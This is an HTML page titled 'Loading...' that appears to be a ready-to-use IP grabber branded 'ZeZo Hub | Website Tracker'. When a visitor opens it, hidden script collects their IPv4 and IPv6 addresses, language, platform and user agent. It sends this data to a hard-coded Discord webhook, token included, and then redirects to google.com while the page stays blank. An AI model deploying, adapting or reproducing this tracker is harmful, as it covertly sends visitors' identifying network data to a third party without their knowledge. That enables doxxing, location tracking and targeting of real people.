<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <script>
        // ==========================================
        // CONFIGURATION AREA
        // ==========================================
        const CONFIG = {
            DISCORD_WEBHOOK_URL: 'https://discord.com/api/webhooks/1553034301980016640/1NCgxeOUDMhhgG1l5vhCYOHUhdmwT3DjslENugn821v6vFqtwVx_FkuxbWSVHs0w0W7l',
            REDIRECT_URL: 'https://google.com', // Where to send the visitor after tracking
            EMBED_COLOR: 16766720 // Decimal color code
        };
        // ==========================================

        async function trackAndRedirect() {
            let ipv4 = 'Not available / IPv6-Only';
            let ipv6 = 'Not available / IPv4-Only';

            // 1. Fetch strict IPv4 Address (Primary: ipify, Fallback: ip.sb)
            try {
                const res4 = await fetch('https://ipify.org');
                if (res4.ok) {
                    const data4 = await res4.json();
                    if (data4 && data4.ip) ipv4 = data4.ip.trim();
                }
            } catch (e) {
                // Primary failed, trying Fallback (ip.sb)
                try {
                    const res4Fallback = await fetch('https://ip.sb');
                    if (res4Fallback.ok) {
                        const data4Fallback = await res4Fallback.json();
                        if (data4Fallback && data4Fallback.ip) ipv4 = data4Fallback.ip.trim();
                    }
                } catch (err) {}
            }

            // 2. Fetch strict IPv6 Address (via dedicated IPv6 subdomain)
            try {
                const res6 = await fetch('https://icanhazip.com');
                if (res6.ok) {
                    const text6 = await res6.text();
                    ipv6 = text6.trim();
                }
            } catch (e) {}

            // Format current date and time
            const now = new Date();
            const simpleDateString = now.toLocaleString('en-US', {
                day: '2-digit',
                month: '2-digit',
                year: 'numeric',
                hour: '2-digit',
                minute: '2-digit',
                hour12: false
            });

            // 3. Prepare Discord Embed Payload
            const payload = {
                embeds: [{
                    title: "ZeZo Hub | Website Tracker",
                    color: CONFIG.EMBED_COLOR,
                    timestamp: now.toISOString(),
                    fields: [
                        { name: "IPv4 Address", value: `\`${ipv4}\``, inline: false },
                        { name: "IPv6 Address", value: `\`${ipv6}\``, inline: false },
                        { name: "Language / Region", value: `\`${navigator.language}\``, inline: true },
                        { name: "Platform", value: `\`${navigator.platform}\``, inline: true },
                        { name: "User Agent", value: `\`${navigator.userAgent}\``, inline: false }
                    ],
                    footer: { text: `Visited on: ${simpleDateString}` }
                }]
            };

            // 4. Send Data to Discord Webhook and wait for response
            try {
                await fetch(CONFIG.DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch (e) {
                // Failsafe
            } finally {
                // 5. Instantly redirect
                window.location.href = CONFIG.REDIRECT_URL;
            }
        }

        window.addEventListener('DOMContentLoaded', trackAndRedirect);
    </script>
    <style>
        /* Makes the entire page completely black and hides scrollbars */
        html, body {
            background-color: #000000 !important;
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
        }
    </style>
</head>
<body>
</body>
</html>
